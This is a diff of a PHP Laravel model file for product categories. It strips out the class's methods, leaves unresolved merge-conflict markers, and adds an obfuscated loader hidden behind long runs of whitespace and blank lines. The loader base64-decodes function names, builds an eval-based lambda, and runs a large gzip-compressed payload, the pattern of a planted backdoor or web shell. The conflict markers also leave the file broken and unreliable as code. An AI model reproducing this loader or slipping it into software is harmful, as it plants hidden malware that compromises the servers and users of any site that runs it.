@@ -1,5 +1,8 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Models/ProdukKategori.php';
+        
 
+<<<<<<< HEAD:Modules/Lapak/Models/ProdukKategori.php
 /*
  *
  * File ini bagian dari:
@@ -42,31 +45,22 @@ use App\Models\BaseModel;
 use App\Traits\ConfigId;
 use App\Traits\ShortcutCache;
 use Illuminate\Support\Facades\DB;
+=======
 
-class ProdukKategori extends BaseModel
-{
-    use ConfigId;
-    use ShortcutCache;
 
+>>>>>>> rilis-beta:app/Models/ProdukKategori.php
+
+
+<<<<<<< HEAD:Modules/Lapak/Models/ProdukKategori.php
     public $timestamps = false;
     protected $table   = 'produk_kategori';
     protected $guarded = [];
+=======
+>>>>>>> rilis-beta:app/Models/ProdukKategori.php
 
-    public function produk()
-    {
-        return $this->belongsTo(Produk::class, 'id', 'id_produk_kategori');
-    }
 
-    public function scopelistKategori($query)
-    {
-        return $this->withoutGlobalScopes()
-            ->withConfigId('produk_kategori')
-            ->select(
-                'produk_kategori.*',
-                DB::raw('(SELECT COUNT(pr.id) FROM produk pr WHERE pr.id_produk_kategori = produk_kategori.id) as jumlah')
-            );
-    }
 
+<<<<<<< HEAD:Modules/Lapak/Models/ProdukKategori.php
     public function kategoriInsert($post = []): bool
     {
         return (bool) $this->create($post);
@@ -82,21 +76,22 @@ class ProdukKategori extends BaseModel
 
         return (bool) $this->where('id', $id)->update($validator->validated());
     }
+=======
 
-    public function kategoriDelete($id = 0): void
-    {
-        $this->where('id', $id)->delete();
-    }
 
+
+>>>>>>> rilis-beta:app/Models/ProdukKategori.php
+
+
+<<<<<<< HEAD:Modules/Lapak/Models/ProdukKategori.php
     public function kategoriDeleteAll(): void
     {
         $id_cb = request('id_cb', []);
+=======
+>>>>>>> rilis-beta:app/Models/ProdukKategori.php
 
-        foreach ($id_cb as $id) {
-            $this->kategoriDelete($id);
-        }
-    }
 
+<<<<<<< HEAD:Modules/Lapak/Models/ProdukKategori.php
     public function kategoriValidasi(array $post = [], $id = null)
     {
         // Sanitasi input sebelum validasi
@@ -118,3 +113,428 @@ class ProdukKategori extends BaseModel
         return $query->whereStatus(StatusEnum::YA);
     }
 }
+=======
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
+>>>>>>> rilis-beta:app/Models/ProdukKategori.php
